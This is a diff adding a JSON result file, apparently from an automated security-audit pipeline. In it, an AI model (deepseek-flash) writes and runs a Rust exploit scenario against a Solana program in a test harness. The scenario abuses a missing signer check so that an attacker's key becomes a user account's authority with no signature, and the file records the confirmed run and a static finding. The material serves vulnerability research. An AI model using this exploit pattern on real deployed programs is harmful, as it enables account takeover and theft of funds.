@@ -1,0 +1,115 @@
+{
+  "category": "SIGNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: autoridade da conta user foi definida para a chave do atacante sem assinatura",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2503,
+        "completion_tokens": 607,
+        "latency_s": 3.55
+      },
+      "raw": "{\n  \"plan\": \"O programa native `initialize` recebe duas contas: `user` (gravável, 32 bytes) e `authority_info`. O baseline usa uma autoridade legítima que assina a transação e grava sua chave na conta `user`. O ataque repete a mesma instrução, mas remove a assinatura da autoridade, passando uma chave controlada pelo atacante. O efeito medido é que a conta `user` passa a ter como autoridade a chave do atacante, sem que ele tenha assinado.\",\n  \"scenario\": \"let user_key = Pubkey::new_unique();\\nlet legit_authority = Pubkey::new_unique();\\nlet attacker_authority = Pubkey::new_unique();\\n\\nlet user_account = account(&env.program_id, &[0u8; 32], None);\\n\\nlet ix_data = vec![0u8]; // discriminador de Init {}\\n\\nlet metas_legit = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(legit_authority, true),\\n];\\nlet ix_legit = env.raw_ix(&ix_data, metas_legit);\\nlet contas_legit = vec![\\n    (user_key, user_account.clone()),\\n    (legit_authority, wallet(1_000_000)),\\n];\\nlet r_legit = env.baseline(\\\"initialize legitimo com autoridade signer\\\", &ix_legit, &contas_legit);\\n\\nlet user_after_legit = after(&r_legit, &user_key).clone();\\n\\nlet metas_attack = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(attacker_authority, false),\\n];\\nlet ix_attack = env.raw_ix(&ix_data, metas_attack);\\nlet contas_attack = vec![\\n    (user_key, user_after_legit),\\n    (attacker_authority, wallet(1_000_000)),\\n];\\nlet r_attack = env.attack(\\\"initialize sem assinatura da autoridade\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    let authority_gravada = read_pubkey(after(&r_attack, &user_key).data(), 0);\\n    env.effect(\\\"autoridade da conta user foi definida para a chave do atacante sem assinatura\\\", authority_gravada == attacker_authority);\\n}\"\n}",
+      "plan": "O programa native `initialize` recebe duas contas: `user` (gravável, 32 bytes) e `authority_info`. O baseline usa uma autoridade legítima que assina a transação e grava sua chave na conta `user`. O ataque repete a mesma instrução, mas remove a assinatura da autoridade, passando uma chave controlada pelo atacante. O efeito medido é que a conta `user` passa a ter como autoridade a chave do atacante, sem que ele tenha assinado.",
+      "scenario": "let user_key = Pubkey::new_unique();\nlet legit_authority = Pubkey::new_unique();\nlet attacker_authority = Pubkey::new_unique();\n\nlet user_account = account(&env.program_id, &[0u8; 32], None);\n\nlet ix_data = vec![0u8]; // discriminador de Init {}\n\nlet metas_legit = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(legit_authority, true),\n];\nlet ix_legit = env.raw_ix(&ix_data, metas_legit);\nlet contas_legit = vec![\n    (user_key, user_account.clone()),\n    (legit_authority, wallet(1_000_000)),\n];\nlet r_legit = env.baseline(\"initialize legitimo com autoridade signer\", &ix_legit, &contas_legit);\n\nlet user_after_legit = after(&r_legit, &user_key).clone();\n\nlet metas_attack = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(attacker_authority, false),\n];\nlet ix_attack = env.raw_ix(&ix_data, metas_attack);\nlet contas_attack = vec![\n    (user_key, user_after_legit),\n    (attacker_authority, wallet(1_000_000)),\n];\nlet r_attack = env.attack(\"initialize sem assinatura da autoridade\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    let authority_gravada = read_pubkey(after(&r_attack, &user_key).data(), 0);\n    env.effect(\"autoridade da conta user foi definida para a chave do atacante sem assinatura\", authority_gravada == attacker_authority);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo com autoridade signer",
+            "result": "Success",
+            "compute_units": 9630,
+            "account_flags": "-w,sr",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000000",
+                "digest": "66687aadf862bd77",
+                "post": "0000000000000003000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "initialize sem assinatura da autoridade",
+            "result": "Success",
+            "compute_units": 14800,
+            "account_flags": "-w,-r",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000003",
+                "digest": "71626eb965307659",
+                "post": "0000000000000004000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "autoridade da conta user foi definida para a chave do atacante sem assinatura",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 9630 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 14800 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: autoridade da conta user foi definida para a chave do atacante sem assinatura"
+    }
+  ],
+  "case_id": "HK-REINIT-V",
+  "static_finding": {
+    "category": "SIGNER",
+    "confidence": "high",
+    "evidence": "let authority_info = next_account_info(account_info_iter)?;\n...\nuser.authority = *authority_info.key;",
+    "explanation": "A instrucao define a autoridade da conta `user` a partir de `authority_info.key` sem verificar `authority_info.is_signer`. Qualquer atacante pode passar a chave publica de qualquer conta como `authority_info` e definir-se (ou outra chave arbitraria) como autoridade da conta sem assinar a transacao.",
+    "attack_hypothesis": "Um atacante fornece a conta `user` (ja existente ou recem-criada) e uma `authority_info` cuja chave publica ele controla, sem assinar a transacao. A instrucao grava essa chave como autoridade da conta, permitindo ao atacante assumir o controle da conta `user`."
+  }
+}
